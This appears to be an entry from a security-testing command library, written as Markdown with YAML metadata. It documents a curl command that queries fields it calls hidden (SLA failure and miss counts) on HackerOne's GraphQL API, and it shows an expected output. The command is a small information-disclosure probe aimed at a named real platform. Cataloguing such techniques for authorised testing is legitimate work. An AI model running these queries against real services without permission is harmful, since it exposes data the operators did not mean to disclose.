---
id: cmd-query-hidden-sla
data: >-
  curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json"
  -d '{"query": "query
  {team(handle:\"security\"){sla_failed_count,sla_missed_count}}"}' -o
  sla_data.json
tags:
  - graphql
  - hidden-fields
type: command
output: '{"data": {"team": {"sla_failed_count": 0, "sla_missed_count": 0 }}}'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.421Z'
verified: false
validated: true
submitted: true
---
# query-hidden-sla-fields

## Command

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"security\"){sla_failed_count,sla_missed_count}}"}' -o sla_data.json
```

## Description

Queries hidden fields on a GraphQL node to access undisclosed metrics like SLA counts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `handle:\"security\"` | Node identifier | Yes |
| Fields: sla_failed_count,sla_missed_count | Hidden metric fields | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"security\"){sla_failed_count}}"}'
```

### Advanced Usage

Include multiple hidden fields.

## Expected Output

{"data": {"team": {"sla_failed_count": 0, "sla_missed_count": 0 }}}

## Related

- [[commands/query-deprecated-team-node]]
- [[procedures/Access-Hidden-GraphQL-Fields]]
